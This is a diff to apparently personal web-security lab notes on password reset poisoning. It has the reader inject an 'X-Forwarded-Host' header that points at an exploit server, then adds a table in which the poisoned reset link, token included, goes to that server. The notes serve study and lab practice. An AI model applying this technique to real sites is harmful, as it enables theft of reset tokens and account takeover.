@@ -188,10 +188,12 @@ Explore the password reset functionality fully by changing the password of a kno
 - try if the `X-Forwarded-Host:` header works  
 	- add the following ->  `X-Forwarded-Host: donotput_https://_here`
 	- replace `donotput_https://_here` w exploit server link. The link should be a server where u have access to logs 
-	
-Without the `X-Forwarded-Host` - Header 
 
 
+| With the `X-Forwarded-Host`                                                                                 | Without the `X-Forwarded-Host`                                                                   |
+| ----------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
+| `https://exploit-server-fsd7903dawd3rfeas.exploit-server.net/forgot-password?temp-forgot-pass-token=ewf...` | `https://0aec007903dawd3r.websecurity-academy.net/forgot-password?temp-forgot-pass-token=ewf...` |
+|                                                                                                             |                                                                                                  |
 
 ### References 
 
